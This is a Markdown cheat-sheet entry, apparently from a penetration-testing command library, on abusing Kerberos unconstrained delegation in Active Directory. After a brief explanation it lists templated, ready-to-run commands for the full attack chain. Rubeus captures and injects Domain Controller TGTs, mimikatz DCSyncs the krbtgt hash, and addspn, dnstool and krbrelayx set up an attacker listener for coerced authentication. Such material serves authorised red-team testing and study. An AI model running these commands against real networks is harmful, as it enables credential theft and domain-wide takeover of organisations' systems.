---
technique: UnconstrainedDelegation
category: kerberos-delegation
targets: Domain Computer, Domain User
protocols: Kerberos
remote_capable: true
tags: kerberos delegation unconstrained tgt coercion ad
---

# Unconstrained Delegation

When an account (user or computer) is configured with unconstrained delegation, any user that authenticates to it via Kerberos delivers a copy of their TGT embedded in the service ticket. Compromising that account and combining it with a coercion primitive (PrinterBug, PetitPotam, etc.) lets an attacker extract high-value TGTs, including a Domain Controller's TGT, and use them to reach domain admin equivalent access. Accounts marked "sensitive and cannot be delegated" or members of the Protected Users group do not forward their TGT, though the native RID-500 Administrator is exempt from that protection even when added to Protected Users.

## Windows

Run Rubeus on the already-compromised unconstrained-delegation host to monitor incoming service tickets and extract embedded TGTs.

### Rubeus monitor

#powershell #rubeus #tgt-capture

Monitor incoming Kerberos authentications on the compromised host and extract embedded TGTs.

```powershell title:"Monitor for delegated TGTs with Rubeus"
.\Rubeus.exe monitor /interval:5
```
<!-- cheat -->

### Rubeus asktgs

#powershell #rubeus #ptt

Use the captured base64 TGT to request a service ticket for a target SPN and inject it.

```powershell title:"Request service ticket from captured TGT"
.\Rubeus.exe asktgs /ticket:$base64_tgt /service:$target_spn /ptt
```
<!-- cheat
var base64_tgt
var target_spn
-->

### mimikatz dcsync

#powershell #mimikatz #dcsync

After injecting a Domain Controller TGT, use mimikatz to DCSync the krbtgt hash.

```powershell title:"DCSync krbtgt via injected DC TGT"
lsadump::dcsync /dc:$dc_fqdn /domain:$domain /user:krbtgt
```
<!-- cheat
var dc_fqdn
var domain
-->

## Linux

Set up a krbrelayx listener on the attacker machine, add the necessary SPN and DNS record to the compromised account, then coerce a target to authenticate back.

### addspn

#python #krbrelayx #spn

Add an attacker-controlled SPN to the compromised account's msDS-AdditionalDnsHostName so coerced targets know where to authenticate.

```sh title:"Add attacker SPN to compromised account via addspn"
addspn.py -u "$domain"/"$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee":"$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn"
```
<!-- cheat
import domain_ip
import users
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### dnstool

#python #krbrelayx #dns

Add a DNS A record for the attacker hostname so the coerced target can resolve it.

```sh title:"Add attacker DNS record via dnstool"
dnstool.py -u "$domain"/"$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee":"$nt_hash" -r "$attacker_fqdn" -d "$lhost" --action add "$dc_fqdn"
```
<!-- cheat
import domain_ip
import tun_ip
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### krbrelayx (computer account)

#python #krbrelayx #listener

Start the krbrelayx listener using an AES key to receive and decrypt incoming Kerberos authentications from a computer account.

```sh title:"Start krbrelayx listener with AES key (computer account)"
krbrelayx.py -aesKey $aes256_key
```
<!-- cheat
var aes256_key
-->

### krbrelayx (user account)

#python #krbrelayx #listener

Start the krbrelayx listener using an NT hash to receive and decrypt incoming Kerberos authentications from a user account.

```sh title:"Start krbrelayx listener with NT hash (user account)"
krbrelayx.py -hashes "aad3b435b51404eeaad3b435b51404ee":"$nt_hash"
```
<!-- cheat
var nt_hash
-->

### getTGT (optional pre-step)

#python #impacket #tgt

Request a TGT for the compromised machine account when credentials are known, for use in subsequent steps.

```sh title:"Get TGT for compromised machine account"
getTGT.py -dc-ip "$rhost_ip" -hashes "aad3b435b51404eeaad3b435b51404ee":"$nt_hash" "$domain"/"$machine_account$"
```
<!-- cheat
import domain_ip
var dc_ip
var nt_hash
var domain
var machine_account
-->

### export KRB5CCNAME (getTGT)

#shell #env

Set KRB5CCNAME to the machine account ccache written by getTGT.py.

```sh title:"Load getTGT.py ccache into KRB5CCNAME"
export KRB5CCNAME="$machine_account$.ccache"
```
<!-- cheat
var machine_account
-->
